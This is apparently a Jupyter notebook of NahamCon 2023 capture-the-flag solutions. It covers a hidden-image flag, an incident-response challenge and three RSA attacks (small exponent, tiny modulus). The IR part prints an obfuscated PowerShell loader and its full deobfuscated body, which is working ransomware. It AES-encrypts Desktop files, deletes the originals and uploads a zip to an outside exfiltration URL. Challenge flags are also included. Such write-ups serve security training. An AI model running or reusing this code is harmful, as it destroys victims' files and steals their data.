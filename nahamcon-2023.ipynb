{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Hidden figures\n",
    "The flag was hidden as a second image, inside one of the base64 encoded images displayed on the website  \n",
    "\n",
    "**Flag:** `flag{e62630124508ddb3952843f183843343}`"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IR\n",
    "\n",
    "**Task 1**\n",
    "Find the hidden file - `/Users/IEUser/Documents/hidden/directory/Ransom note.txt`\n",
    "```\n",
    "All of your files have been encrypted. Please reach out via Telegram to awesome10billion for further instructions.\n",
    "Secret passphrase is flag{053692b87622817f361d8ef27482cc5c}\n",
    "```\n",
    "\n",
    "**Task 2**\n",
    "Reverse the malware - After discovering the obfuscated powershell malware, unpacking it and reviewing its real content we get the flag\n",
    "\n",
    "**Task 3**\n",
    "Data exfiltration - In the malware. the URL for exfiltrating the data is stored in plain text. Hashing this value gives the flag\n",
    "- `flag{md5sum(\"https://www.thepowershellhacker.com/exfiltration\")}` => `flag{892a8921517dcecf90685d478aedf5e2}`\n",
    "\n",
    "**Task 4**\n",
    "4. Unknown - Didn't figure out the correct syntax for decrypting the AES blobs using the key \"7h3_k3y_70_unl0ck_4ll_7h3_f1l35!\" and an initialisation vector which is written to the start/end of the binary files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "powershell"
    }
   },
   "outputs": [],
   "source": [
    "#Unpacked malware data\n",
    "\n",
    "$9HvtMFbC2RGJX6YOASjNeBx = \"=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\" ;\n",
    "$OaET = $9HvtMFbC2RGJX6YOASjNeBx.ToCharArray() ;\n",
    "[array]::Reverse($OaET) ;\n",
    "-join $OaET 2>&1> $null ;\n",
    "$biPIv9ahScgYwGXl0FyV = [SySteM.tExt.EnCOding]::uTf8.GetStRIng([SySTEm.COnVerT]::FrombASe64StRINg(\"$OaET\")) ;\n",
    "$ehyGknDcqxFwCYJz5vfot4T8 = \"iN\"+\"vo\"+\"Ke\"+\"-e\"+\"xP\"+\"RE\"+\"ss\"+\"Io\"+\"n\" ;\n",
    "neW-aLIAs -NAme PwN -VAlUE $ehyGknDcqxFwCYJz5vfot4T8 -forCE ;\n",
    "pWN $biPIv9ahScgYwGXl0FyV ;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "powershell"
    }
   },
   "outputs": [],
   "source": [
    "#Deobfuscated and completely unpacked\n",
    "function encryptFiles{\n",
    "\tParam(\n",
    "\t\t[Parameter(Mandatory=${true}, position=0)]\n",
    "\t\t[string] $baseDirectory\n",
    "\t)\n",
    "\tforeach($File in (Get-ChildItem $baseDirectory -Recurse -File)){\n",
    "\t\tif ($File.extension -ne \".enc\"){\n",
    "\t\t\t$DestinationFile = $File.FullName + \".enc\"\n",
    "\t\t\t$FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)\n",
    "\t\t\t$FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)\n",
    "\t\t\t$cipher = [System.Security.Cryptography.SymmetricAlgorithm]::Create(\"AES\")\n",
    "\t\t\t$cipher.key = [System.Text.Encoding]::UTF8.GetBytes(\"7h3_k3y_70_unl0ck_4ll_7h3_f1l35!\")\n",
    "\t\t\t$cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\n",
    "\t\t\t$cipher.GenerateIV()\n",
    "\t\t\t$FileStreamWriter.Write([System.BitConverter]::GetBytes($cipher.IV.Length), 0, 4)\n",
    "\t\t\t$FileStreamWriter.Write($cipher.IV, 0, $cipher.IV.Length)\n",
    "\t\t\t$Transform = $cipher.CreateEncryptor()\n",
    "\t\t\t$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, \n",
    "                                                            [System.Security.Cryptography.CryptoStreamMode]::Write)\n",
    "\t\t\t$FileStreamReader.CopyTo($CryptoStream)\n",
    "\t\t\t$CryptoStream.FlushFinalBlock()\n",
    "\t\t\t$CryptoStream.Close()\n",
    "\t\t\t$FileStreamReader.Close()\n",
    "\t\t\t$FileStreamWriter.Close()\n",
    "\t\t\tRemove-Item -LiteralPath $File.FullName\n",
    "\t\t}\n",
    "\t}\n",
    "}\n",
    "$flag = \"flag{892a8921517dcecf90685d478aedf5e2}\"\n",
    "$ErrorActionPreference= 'silentlycontinue'\n",
    "$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split(\"\\\")[-1]\n",
    "encryptFiles(\"C:\\Users\\\"+$user+\"\\Desktop\")\n",
    "Add-Type -assembly \"system.io.compression.filesystem\"\n",
    "[io.compression.zipfile]::CreateFromDirectory(\"C:\\Users\\\"+$user+\"\\Desktop\", \"C:\\Users\\\"+$user+\"\\Downloads\\Desktop.zip\")\n",
    "$zipFileBytes = Get-Content -Path (\"C:\\Users\\\"+$user+\"\\Downloads\\Desktop.zip\") -Raw -Encoding Byte\n",
    "$zipFileData = [Convert]::ToBase64String($zipFileBytes)\n",
    "$body = ConvertTo-Json -InputObject @{file=$zipFileData}\n",
    "Invoke-Webrequest -Method Post -Uri \"https://www.thepowershellhacker.com/exfiltration\" -Body $body\n",
    "Remove-Item -LiteralPath (\"C:\\Users\\\"+$user+\"\\Downloads\\Desktop.zip\")"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### RSA intro\n",
    "Three separate attacks on the RSA cipher, yields the real flag `flag{361862d054e2a9abe41cc315517cfa31}`.  \n",
    "One caveat is that one of the attacks produced a float which had to be rounded up."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Part 1 - Decryption\n",
    "import libnum\n",
    "e = 65537\n",
    "p = 152933908726088000025981821717328900253841375038873501148415965946834656401640031351528841350980891403699057384028031438869081577476655254545307973436745130347696405243778481262922512227444915738801835842194123487258255790292004204412236314558718035967575479232723997430178018130995420315759809636522091902529\n",
    "q = 173403581892981708663967289381727914513043623656015065332774927693090954681172215632003125824638611519248812013286298011144213434368768979531792528759533473573346156338400142951284462417074992959330154930806611253683603690442142765076944118447174491399811297223146324861971722035746276165056022562961558299229\n",
    "ct = 24900222896050719055946861973957246283663114493271057619080357155524140641110166671081924849912377863714741017586072836978357770860853088772671413685690588862677870057778743649753806625109141461870634890427341765490174013453580041222600439459744928592280825572907034701116518706347830413085865254963646096687533779205345001529893651672061316525244476464884343232361498032095529980932018530224029715267731845742371944443150142380656402289372470902457020777826323051802030062577945893807552316343833971210833255536637260838474638607847822451324479398241526919184038034180388382949827367896808363560947298749154349868503\n",
    "\n",
    "n = p*q\n",
    "PHI = (p-1)*(q-1)\n",
    "d = (libnum.invmod(e, PHI))\n",
    "\n",
    "res=pow(ct,d, n)\n",
    "m1 = res.to_bytes(12,\"big\")\n",
    "print(m1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Part 2 - Can't remember the attacks name.  But based on the exponent being tiny\n",
    "from decimal import *\n",
    "import math\n",
    "e = 3\n",
    "n = 17832697294201997154036617011957221780954165482288666773904510458098283881743910060438108775052144170769164876758249100567442926826366952851643073820832317493086415304740069439166953466125367940677570548218324219386987869433677168670642103353927101790341856159406926994785020050276564014860180970395749578442970075496442876475883003906961049702649859496118324912885388643549649071478725024867410660900848046927547400320456993982744075508818567475254504481562096763749301743619222457897353143558783627148704136084952125284873914605708215421331001883445600583624655438154001230490220705092656548338632165583188199066759\n",
    "c = 55717486909410107003108426413232346564412491530111436942121941739686926249314710854996834619\n",
    "\n",
    "# https://docs.python.org/3/library/decimal.html\n",
    "c = Decimal(c)\n",
    "e = Decimal(e)\n",
    "\n",
    "getcontext().prec = 1000 # Set a big enough precision\n",
    "root = pow(c, 1/e) # Calculate c^(1/e) = m^(e * 1/e) = m\n",
    "\n",
    "# Decode with no padding\n",
    "res = math.ceil(root)\n",
    "m2 = res.to_bytes(13,\"big\")\n",
    "print(m2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Task three - tiny N-value which could easily be factorized and the used to generate the decryption key-\n",
    "import libnum\n",
    "e = 65537\n",
    "n = 107710970774233\n",
    "p = 8885719\n",
    "q = 12121807\n",
    "ct = [18128889449669, 12202311999558, 10705744036504, 23864757944740]\n",
    "\n",
    "PHI = (p-1)*(q-1)\n",
    "d = (libnum.invmod(e, PHI))\n",
    "\n",
    "m3_s = []\n",
    "for c in ct:\n",
    "    res=pow(c,d, n)\n",
    "    m3_s.append(res.to_bytes(4,\"big\"))\n",
    "m3 = \"\".join([m.decode() for m in m3_s])\n",
    "print(m3.replace(\"\",\"\"))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
